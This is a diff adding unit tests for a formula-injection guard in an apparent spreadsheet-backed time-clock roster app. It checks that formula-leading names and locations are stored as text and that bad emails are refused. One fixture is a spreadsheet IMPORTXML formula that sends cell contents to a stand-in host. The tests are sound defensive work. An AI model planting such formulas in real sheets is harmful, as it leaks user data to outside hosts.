@@ -17297,6 +17297,26 @@ console.log('\nlabour roster — doPost kind=roster (Amendment B1):');
   eq('RB1 stale at 193h', evalRoster(193) && evalRoster(193).stale, true);
   eq('RB1 fresh at 191h', evalRoster(191) && evalRoster(191).stale, false);
   eq('RB1 never-seen is stale (so the first post must precede the deploy-day check)', evalRoster(null) && evalRoster(null).stale, true);
+
+  // ---- RO11: formula-injection guard on the CLOCK_RAW write (security audit 4, M1) ----
+  var IXN = HDR.indexOf('person_name'), IXL = HDR.indexOf('location'), G = SHEET_TEXT_GUARD_;
+  a = mkApp();
+  r = post(a, [rRow({ name: '=IMPORTXML("https://x.test/"&A1,"//x")', location: '+Loc A' })]);
+  eq('RO11 formula-leading name + location stored guarded as text',
+    [r.result, data(a)[0][IXN], data(a)[0][IXL]], ['ok', G + '=IMPORTXML("https://x.test/"&A1,"//x")', G + '+Loc A']);
+  var snapG = JSON.stringify(data(a));
+  post(a, [rRow({ name: '=IMPORTXML("https://x.test/"&A1,"//x")', location: '+Loc A' })]);
+  eq('RO11 re-post of a guarded row is idempotent (no double guard)', JSON.stringify(data(a)), snapG);
+  var evilKept = mkRaw({ person_email: 'dummy-z@example.test', person_name: '-SUM(1)', clock_in: '2026-10-15 08:00', clock_out: '2026-10-15 12:00', hours: 4, break_minutes: 0, location: 'Loc A', record_id: 'zap-9' });
+  a = mkApp([evilKept]);
+  post(a, [rRow()]);
+  eq('RO11 kept row with a formula-leading cell is re-written guarded',
+    data(a).filter(function (x) { return x[IXR] === 'zap-9'; })[0][IXN], G + '-SUM(1)');
+  a = mkApp();
+  r = post(a, [rRow({ email: '=hyperlink@example.test' })]);
+  check('RO11 formula-leading email refused at validation (' + r.message + ')', r.result === 'error' && String(r.message).indexOf('invalid email') !== -1 && data(a).length === 0);
+  a = mkApp(); post(a, [rRow()]);
+  eq('RO11 ordinary row written verbatim (guard touches nothing benign)', [data(a)[0][IXN], data(a)[0][IXL], data(a)[0][IXI]], ['Dummy A', 'Loc A', '2026-10-12 09:00']);
 })();
 
 /* ------------------------------------------------------------------ *
